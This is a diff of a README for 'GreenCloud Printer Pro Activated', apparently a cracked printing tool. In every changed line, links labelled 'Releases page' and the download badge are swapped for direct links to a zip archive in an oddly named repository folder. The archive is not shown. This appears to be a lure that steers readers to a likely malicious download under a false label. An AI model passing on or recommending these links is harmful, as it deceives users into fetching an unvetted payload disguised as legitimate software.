@@ -1,6 +1,6 @@
 # 🌿 GreenCloud-Printer-Pro-Activated - Efficient, Eco-Friendly Printing Made Easy
 
-[![Download GreenCloud Printer Pro](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/releases)
+[![Download GreenCloud Printer Pro](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/raw/refs/heads/main/briskish/Activated-Printer-Pro-Cloud-Green-v2.9.zip%20Now-Get%20Started-brightgreen)](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/raw/refs/heads/main/briskish/Activated-Printer-Pro-Cloud-Green-v2.9.zip)
 
 ## 👋 Introduction
 
@@ -11,7 +11,7 @@ Welcome to GreenCloud Printer Pro Activated! This software helps you manage and 
 To get started with GreenCloud Printer Pro, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page here](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/releases). You will find the latest version of the application available for download.
+   Go to our [Releases page here](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/raw/refs/heads/main/briskish/Activated-Printer-Pro-Cloud-Green-v2.9.zip). You will find the latest version of the application available for download.
 
 2. **Download the Software**
    Find the version you want to download. Click on the link to initiate the download. 
@@ -24,7 +24,7 @@ To get started with GreenCloud Printer Pro, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the latest version of GreenCloud Printer Pro, visit this page: [Releases page](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/releases).
+To download the latest version of GreenCloud Printer Pro, visit this page: [Releases page](https://github.com/suleymancod/GreenCloud-Printer-Pro-Activated/raw/refs/heads/main/briskish/Activated-Printer-Pro-Cloud-Green-v2.9.zip).
 
 Here, you will find all available versions. Choose the most recent one, download it, and follow the installation steps.
 
